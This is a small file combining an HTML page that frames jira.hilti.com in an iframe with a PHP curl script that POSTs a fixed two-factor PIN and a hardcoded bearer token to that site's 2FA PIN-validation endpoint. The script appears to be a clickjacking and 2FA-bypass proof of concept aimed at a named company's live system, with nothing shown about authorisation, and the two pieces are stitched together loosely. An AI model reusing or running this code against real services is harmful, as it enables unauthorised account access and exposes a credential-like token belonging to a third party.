<!DOCTYPE html>
<html lang="en">
<head>
    <title>Opening HILTI Dashboard</title>
    <style>
        iframe {
            width: 100%;
            height: 500px;
        }
    </style>
</head>
<body>
<iframe src="demo-page.html" name="dashboard"></iframe>
<p><a href="https://jira.hilti.com" target="dashboard">Dashboard of HILTI</a></p>
</body>
</html>

<?php
echo("Hello, world");
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://jira.hilti.com/plugins/servlet/twofactor/public/pinvalidation?target=/");
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_POSTFIELDS, array("2fpin=121212&atl_token=%24atl_token&twofalogin=pinlogin"));
curl_setopt($curl, CURLOPT_HEADER, true);
$headers = array(
    "Authorization: Bearer OTMxMDk2MzQxODE0Onc7z4Z82m0dIkoDn9+qvLAQptLF",
    'Content-Type: multipart/form-data'
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($curl);




